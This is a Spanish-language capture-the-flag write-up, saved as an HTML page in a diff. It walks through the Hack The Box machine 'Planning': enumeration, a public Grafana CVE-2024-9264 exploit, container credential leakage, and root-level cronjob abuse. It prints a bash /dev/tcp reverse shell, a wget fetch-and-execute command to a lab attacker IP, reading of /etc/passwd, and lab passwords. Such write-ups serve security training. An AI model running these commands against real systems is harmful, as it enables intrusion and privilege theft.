@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<!-- saved from url=(0050)https://secret.club/2022/05/11/fuzzing-solana.html -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="theme-color" content="#111111"><meta property="og:image" content="/assets/twitter.png"><link rel="preload" href="./fonts.min.css" as="style"><link rel="stylesheet" href="./fonts.min.css"><link rel="alternate" type="application/atom+xml" title="juanchan.es RSS" href="https://juanchan.es">
+
+    <title>Planning - juanchan.es</title>
+
+
+    <meta name="generator" content="Jekyll v3.9.3"><meta property="og:title" content="maquinas/ctf"><meta name="author" content="addison"><meta property="og:locale" content="en_US"><meta name="description" content="maquinas/ctf juanchan.es"><meta property="og:description" content="maquinas/ctf juanchan.es"><link rel="canonical" href="https://juachan.es"><meta property="og:url" content="https://juachan.es"><meta property="og:site_name" content="juanchan"><meta property="og:type" content="article"><meta property="article:published_time" content="2022-05-11T07:00:00+00:00"><script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"addison"},"dateModified":"2022-05-11T07:00:00+00:00","datePublished":"2022-05-11T07:00:00+00:00","description":"maquinas/ctf juanchan.es","headline":"maquinas/ctf juanchan","mainEntityOfPage":{"@type":"WebPage","@id":"https://juanchan.es"},"url":"https://juanchan.es"}</script><style> * { margin: 0; padding: 0; box-sizing: border-box; color: inherit; text-decoration: inherit; } html { background: var(--bg-0); color: var(--text-0); width: 100%; text-rendering: optimizeLegibility; font-feature-settings: "kern" 1; font-feature-settings: "liga" 1; min-width: 100vw; overflow-x: hidden; -webkit-text-size-adjust: 100%; } @media all and (min-width:640px) { html{ font-size: 16.5px; } } @media all and (min-width:720px) { html{ font-size: 17px; } } @media all and (min-width:960px) { html{ font-size: 18px; } } body { max-width: 944px; margin: 0 auto; padding: 0 24px; font-family: "Charter", serif; } header, h1, h2, h3, .sans { font-family: 'Space Grotesk', Helvetica, sans-serif; } code, .mono, summary { font-family: 'Source Code Pro', monospace; font-weight: 500; } .img-right { float: right; height: 300px; padding-left: 2em } body > header { display: flex; justify-content: space-between; align-items: center; margin: 2em 0; } nav a { margin-left: 1.5em; letter-spacing: 0.07em; font-size: .9rem; } :root { --text-0: rgba(255, 255, 255, 87%); --text-1: rgba(255, 255, 255, 60%); --bg-0: #121212; --bg-1: rgba(255, 255, 255, 5%); --bg-2: rgba(255, 255, 255, 12%); --accent: #ef5350; --keyword: #b794f6; --string: #89a2f6; --literal: #f88478; --type: #f8819c; } @media (prefers-color-scheme: light) { :root { --text-0: rgba(0, 0, 0, 87%); --text-1: rgba(0, 0, 0, 66%); --bg-0: #fff; --bg-1: #f2f2f2; --bg-2: rgba(0, 0, 0, 12%); --keyword: #7c4dff; --string: #586ada; --literal: #d14641; --type: #bd00f8; } } .tags, .pagination > :nth-child(2) { margin-bottom: 2rem; } .tags, .pagination .mono { color: var(--text-1); font-size: 0.8rem; } .tags > a, .pagination .mono { color: var(--accent); } .pagination { display: flex; justify-content: space-between; flex-wrap: wrap-reverse; } .pagination > a { font-size: 0.9rem; display: inline-block; } .pagination .mono { letter-spacing: 0.07em; } article > :not(main) { font-size: 16px; } article > h1 { font-size: 2rem; margin-bottom: 12px; } .authors { position: absolute; margin-top: 4px; color: var(--text-1); } .authors > a { color: var(--text-0); } article > div > img { display: inline; object-fit: cover; height: 48px; width: 48px; border-radius: 100%; margin-right: 8px; background: var(--bg-1); } article > time { color: var(--text-1); position: absolute; margin: -24px 0 0 56px; } article > hr { width: 128px; border: 2.5px solid var(--bg-1); margin-top: 12px; } main { margin: 2rem 0; } main > :nth-last-child(2) { margin-bottom: 2rem; } main img, main video, main iframe, main object { max-width: 100%; height: auto; display: flex; margin: auto; } main iframe { width: 100%; height: 504px; } p, ul, ol { line-height: 1.35; margin-bottom: 1rem; } details + :not(details) { margin-top: 1rem; } details + h3, details + h2, details + h1 { margin-top: 1.2rem; } object { margin-bottom: 1rem; } h1, h2, h3 { position: relative; margin: 1.2rem 0 0.2rem 0; } h3, h2 { line-height: 24px; } main h1:before, h2:before, h3:before { content: "#"; color: var(--accent); font-weight: bold; float: left; margin-left: -19px; position: absolute; } h3:before { content: ""; margin-left: -17px; height: 10px; width: 10px; background: var(--accent); border-radius: 100%; top: calc(50% - 6px); } h1 { font-size: 1.3em; } h2 { font-size: 1.2em; } h3 { font-size: 1.1em; } p a, main li a { text-decoration: underline; } summary { margin-left: -17px; cursor: pointer; } summary::marker { color: var(--accent); } details :nth-child(2) { margin-top: 0.8rem; } ul { list-style: none; } ul li, ol li { padding-left: 1rem; margin: 0 0 0.2rem 1rem; } ul li::before { content: "•"; float: left; margin-left: -2rem; transform: scale(1.4); } blockquote { color: var(--text-1); font-style: italic; margin: 0 2em; } .footnotes { border-top: 1px solid var(--bg-1); padding-top: 1rem; } pre { border-left: 4px solid var(--bg-1); margin: 0 0 1rem -24px; padding-left: 20px; overflow-x: scroll; scrollbar-width: none; -ms-overflow-style: none; } pre::-webkit-scrollbar { width: 0; height: 0; } :not(pre) > code { background: var(--bg-1); padding: 2px 4px; } pre > code { display: inline-block; } code { font-size: 14px; } @media screen and (min-width: 640px) { code { font-size: 15px; } } @media screen and (max-width: 944px) { main iframe { height: calc((100vw - 24px) * 0.5625); } blockquote { margin: 0 0 0 1.25em; } ul li::before { margin-left: -1.25rem; } ul li { padding-left: 0.625rem; margin-left: 0.625rem; } ol li { padding-left: 0.25rem; } } .aside { color: var(--text-1); } @media screen and (min-width: 1074px) { article::before { background: radial-gradient( circle at center, var(--bg-1) 25%, transparent 25% ), transparent; background-size: 10px 10px; content: ""; display: block; height: 300px; width: 300px; position: absolute; transform: translate(-72px, -72px); z-index: -1; } article { padding: 24px 0 0 24px; margin: -24px 0 0 -24px; background: var(--bg-0); } article h1:first-of-type { margin-top: 0; } body > header { margin-bottom: 5em; } } @media screen and (max-width: 1584px) { .aside { position: relative; padding: 4px 0 4px 0; border-bottom: 1.5px solid var(--bg-1); border-top: 1.5px solid var(--bg-1); } } @media screen and (min-width: 1584px) { .aside { float: left; position: absolute; left: 0; transform: translate(calc(-100% - 28px), calc(-100% - 1rem)); width: 320px; text-align: right; clear: both; } footer { position: absolute; left: calc(100% + 24px); width: 320px; top: 0; } } code .gu, code .gh { font-weight: bold; } code .p { color: var(--text-1); } code .c, code .ch, code .cm, code .cp, code .cpf, code .c1, code .cs { color: var(--text-1); } code .o, code .ow { color: var(--keyword); } code .k, code .kn, code .kc, code .kp, code .kr, code .nt, code b { color: var(--keyword); font-weight: bold; } code .kt, code .kd, code .nb, code .nl, code .nv, code .vc, code .vg, code .vi, code .vm, code .gd { color: var(--type); } code .m, code .mb, code .mf, code .mh, code .mi, code .mo, code .il, code .se { color: var(--literal); } code .s, code .sa, code .sb, code .sc, code .dl, code .sd, code .s2, code .sh, code .si, code .sx, code .sr, code .s1, code .ss, code .gi { color: var(--string); }</style>
+    </head>
+
+
+<body><header align="center"><a href="/maquinas.html">Máquinas/CTF</a><nav><a href="/">Sobre mi</a></nav></header>
+
+
+    <article aria-label="Content" itemscope="" itemtype="http://schema.org/BlogPosting"><h1 itemprop="name headline">Máquina resuelta</h1><div itemprop="author" itemscope="" itemtype="http://schema.org/Person" style="height:48px"> <img itemprop="image" alt="main authors image" src="./Planning.JPG"> <span class="mono authors"> <a href="https://juanchan.es/assets/maquinas/Planning.html" itemprop="name">Planning</a> </span></div><time datetime="2022-05-11T07:00:00+00:00" itemprop="datePublished" class="mono"> May, 2025 </time><hr><main itemprop="articleBody" style="position: relative">
+
+
+<h2 id="1-escaneo-de-puertos-tcp">1. Escaneo de puertos tcp</h2>
+<pre><code class="language-bash">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
+|_  256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
+80/tcp open  http    nginx 1.24.0 (Ubuntu)
+|_http-server-header: nginx/1.24.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://planning.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+<h2 id="2-enumeración">2. Enumeración</h2>
+<p>Una vez añadido el dominio <code>planning.htb</code>al fichero <code>/etc/hosts</code>, hacemos una enumeración de directorios y de subdominios. Del primero no encontramos nada, pero en el segundo realizando la siguiente enumeración:</p>
+<pre><code class="language-bash"># gobuster vhost -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://planning.htb -t 200 --append-domain  -k
+</code></pre>
+<p>Encontramos el siguiente subdominio:</p>
+<pre><code class="language-bash">Found: grafana.planning.htb Status: 302 [Size: 29] [--&gt; /login]
+</code></pre>
+<h2 id="3-explotación">3. Explotación</h2>
+<p>Vemos que se trata de un servicio web de grafana, con un panel de administración, y que se trata de la versión <strong>v11.0.0</strong>. Buscamos si existe alguna vulnerabilidad para dicha versión y encontramos el <strong>CVE-2024-9264</strong>, sobre el cual encontramos el siguiente PoC: <a href="https://github.com/nollium/CVE-2024-9264">https://github.com/nollium/CVE-2024-9264</a>. Para ejecutar dicho exploit necesitamos unos credenciales válidos, por lo que realizamos una enumeración de directorios con el siguiente comando:</p>
+<pre><code class="language-bash"># gobuster dir -u http://grafana.planning.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 --exclude-length 29
+</code></pre>
+<p>Pero los directorios que encontramos no nos aportan nada:</p>
+<pre><code>/public               (Status: 302) [Size: 31] [--&gt; /public/]
+/admin                (Status: 302) [Size: 24] [--&gt; /]
+/signup               (Status: 200) [Size: 38241]
+/login                (Status: 200) [Size: 38241]
+/plugins              (Status: 302) [Size: 24] [--&gt; /]
+/api                  (Status: 401) [Size: 102]
+/verify               (Status: 200) [Size: 38241]
+/metrics              (Status: 200) [Size: 228883]
+</code></pre>
+<p>Revisando de nuevo la máquina en Hackthebox, vemos como en la información de la máquina nos aparece el siguiente mensaje:</p>
+<pre><code class="language-bash">As is common in real life pentests, you will start the Planning box with credentials for the following account: admin / 0D5oT70Fq13EvB5r
+</code></pre>
+<p>Por lo que probamos a loguearnos con dichas credenciales en grafana y damos conseguido acceso como usuarios admin. Por lo que podemos ejecutar el exploit de la siguiente forma:</p>
+<pre><code class="language-bash"># python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r  -f /etc/passwd  http://grafana.planning.htb
+</code></pre>
+<p>Obteniendo el siguiente resultado:</p>
+<pre><code class="language-bash">[+] Logged in as admin:0D5oT70Fq13EvB5r
+[+] Reading file: /etc/passwd
+[+] Successfully ran duckdb query:
+[+] SELECT content FROM read_blob(&#39;/etc/passwd&#39;):
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+grafana:x:472:0::/home/grafana:/usr/sbin/nologin
+</code></pre>
+<p>Creamos entonces una revershell para conseguir acceso al sistema. Realizando los siguientes pasos:</p>
+<ol>
+<li>Empezamos creando el siguiente script en nuestro equipo:<pre><code class="language-bash"># vim exploit.s
+    #!/bin/bash
+    bash -i &gt;&amp; /dev/tcp/10.10.14.41/1234 0&gt;&amp;1
+</code></pre>
+</li>
+<li>Ponemos a la escucha un servidor http para compartir el archivo:<pre><code class="language-bash"># python -m http.server 443
+</code></pre>
+</li>
+<li>Ponemos a la escucha <strong>netcat</strong> en el puerto 1234:<pre><code class="language-bash"># nc -lvnp 1234
+</code></pre>
+</li>
+<li>Lanzamos el exploit para que descargue dicho archivo, otorgue permisos de ejecución y ejecute el script:<pre><code class="language-bash"># python3 CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r  -c &quot;wget http://10.10.14.41:443/exploit.sh -O /tmp/exploit.sh &amp;&amp; chmod +x /tmp/exploit.sh &amp;&amp; /tmp/exploit.sh&quot; http://grafana.planning.htb
+</code></pre>
+</li>
+<li>Vemos como conseguimos acceso:<pre><code class="language-bash">root@7ce659d667d7:~# 
+</code></pre>
+</li>
+</ol>
+<h2 id="3-docker-escape">3. Docker escape</h2>
+<p>Observamos como se trata de un servicio dockerizado. Antes de intentar realizar nada, podemos listar las variables del entorno del contenedor, con el comando <code># env</code>, observando la siguiente respuesta:</p>
+<pre><code class="language-bash"># root@7ce659d667d7:~/conf# env
+    env
+    AWS_AUTH_SESSION_DURATION=15m
+    HOSTNAME=7ce659d667d7
+    PWD=/usr/share/grafana/conf
+    AWS_AUTH_AssumeRoleEnabled=true
+    GF_PATHS_HOME=/usr/share/grafana
+    AWS_CW_LIST_METRICS_PAGE_LIMIT=500
+    HOME=/usr/share/grafana
+    AWS_AUTH_EXTERNAL_ID=
+    SHLVL=2
+    GF_PATHS_PROVISIONING=/etc/grafana/provisioning
+    GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
+    GF_SECURITY_ADMIN_USER=enzo
+    GF_PATHS_DATA=/var/lib/grafana
+    GF_PATHS_LOGS=/var/log/grafana
+    PATH=/usr/local/bin:/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+    AWS_AUTH_AllowedAuthProviders=default,keys,credentials
+    GF_PATHS_PLUGINS=/var/lib/grafana/plugins
+    GF_PATHS_CONFIG=/etc/grafana/grafana.ini
+    _=/usr/bin/env
+    OLDPWD=/usr/share/grafana
+</code></pre>
+<p>Por lo que probamos a loguearnos por ssh, a la máquina, con la siguientes credenciales: <code>enzo - RioTecRANDEntANT!</code>. Conseguimos acceso y obtenemos la <strong>flag de usuario</strong>.</p>
+<h2 id="4-escalado">4. Escalado</h2>
+<p>Descubrimos que existe un servicio http corriendo en el puerto 8000, listando para ello los puertos del sistema:</p>
+<pre><code class="language-bash">$ ss -lntu
+    Netid                State                 Recv-Q                Send-Q                               Local Address:Port                                  Peer Address:Port                Process                
+    udp                  UNCONN                0                     0                                       127.0.0.54:53                                         0.0.0.0:*                                          
+    udp                  UNCONN                0                     0                                    127.0.0.53%lo:53                                         0.0.0.0:*                                          
+    tcp                  LISTEN                0                     151                                      127.0.0.1:3306                                       0.0.0.0:*                                          
+    tcp                  LISTEN                0                     511                                        0.0.0.0:80                                         0.0.0.0:*                                          
+    tcp                  LISTEN                0                     4096                                 127.0.0.53%lo:53                                         0.0.0.0:*                                          
+    tcp                  LISTEN                0                     4096                                     127.0.0.1:44397                                      0.0.0.0:*                                          
+    tcp                  LISTEN                0                     70                                       127.0.0.1:33060                                      0.0.0.0:*                                          
+    tcp                  LISTEN                0                     4096                                    127.0.0.54:53                                         0.0.0.0:*                                          
+    tcp                  LISTEN                0                     4096                                     127.0.0.1:3000                                       0.0.0.0:*                                          
+    tcp                  LISTEN                0                     511                                      127.0.0.1:8000                                       0.0.0.0:*                                          
+    tcp                  LISTEN                0                     4096                                             *:22                                               *:* 
+</code></pre>
+<p>Si miramos en el directorio <code>/opt</code> descubrimos que existe una carpeta <code>crontab</code>, la cual contiene un archivo <strong>crontab.db</strong> con el siguiente contenido:</p>
+<pre><code class="language-bash">{&quot;name&quot;:&quot;Grafana backup&quot;,&quot;command&quot;:&quot;/usr/bin/docker save root_grafana -o /var/backups/grafana.tar &amp;&amp; /usr/bin/gzip /var/backups/grafana.tar &amp;&amp; zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz &amp;&amp; rm /var/backups/grafana.tar.gz&quot;,&quot;schedule&quot;:&quot;@daily&quot;,&quot;stopped&quot;:false,&quot;timestamp&quot;:&quot;Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)&quot;,&quot;logging&quot;:&quot;false&quot;,&quot;mailing&quot;:{},&quot;created&quot;:1740774983276,&quot;saved&quot;:false,&quot;_id&quot;:&quot;GTI22PpoJNtRKg0W&quot;}
+{&quot;name&quot;:&quot;Cleanup&quot;,&quot;command&quot;:&quot;/root/scripts/cleanup.sh&quot;,&quot;schedule&quot;:&quot;* * * * *&quot;,&quot;stopped&quot;:false,&quot;timestamp&quot;:&quot;Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)&quot;,&quot;logging&quot;:&quot;false&quot;,&quot;mailing&quot;:{},&quot;created&quot;:1740849309992,&quot;saved&quot;:false,&quot;_id&quot;:&quot;gNIRXh1WIc9K7BYX&quot;}
+</code></pre>
+<p>Por lo que existe una posible credencial con la contraseña: <code>P4ssw0rdS0pRi0T3c</code>. Forwardeamos el servicio a nuestra máquina con el siguiente comando:</p>
+<pre><code class="language-bash"># ssh -L 1235:127.0.0.1:8000 enzo@planning.htb
+</code></pre>
+<p>Observamos un panel de logueo, por lo que intentamos iniciar sesión. Probamos con los credenciales <code>root - P4ssw0rdS0pRi0T3c</code>, y conseguimos acceso. En dicho panel web, podemos ver una serie de cronjobs, y también la posibilidad de crear nuevos. Con la expectativa de que sean ejecutados como usuario root en la máquina local, creamos un cronjob para copiar el archivo /root/root.txt al directorio del usuario con permisos de lectura. Para ello clickamos en <code>New</code>, y añadimos el siguiente payload al <code>cronjob</code>:</p>
+<pre><code class="language-bash">cp /root/root.txt /home/enzo/read.txt &amp;&amp; chmod 775 /home/enzo/read.txt 
+</code></pre>
+<p>Si accedemos de nuevo a la maquina al directorio de enzo, podemos leer la <strong>flag del usuario root</strong>.</p>
+
+
+        
+
+
+
+
+<p>&nbsp;</p><p>&nbsp;</p>
+</div>
+     <div class="footer-credits" style="display: flex; justify-content: flex-end">
+        <a> Made by Juan González </a>
+    </div>
+</div>
+</body></html>
